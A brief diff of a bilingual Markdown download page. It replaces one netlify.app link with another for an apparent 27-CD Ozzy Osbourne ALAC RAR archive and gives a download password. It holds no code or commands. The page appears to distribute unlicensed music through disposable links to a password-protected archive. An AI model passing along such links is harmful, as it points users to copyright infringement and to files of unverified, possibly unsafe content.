@@ -1,5 +1,5 @@
 ## 下载地址(download link)
-[下载链接 download link](https://voluble-croquembouche-d321dc.netlify.app/?s=Ozzy+Osbourne%E3%80%8A1970-2007%2C27CD%E3%80%8BALAC.rar)
+[下载链接 download link](https://tutu365.netlify.app/?s=Ozzy+Osbourne%E3%80%8A1970-2007%2C27CD%E3%80%8BALAC.rar)
 
 ## 下载密码(download password)
 1866
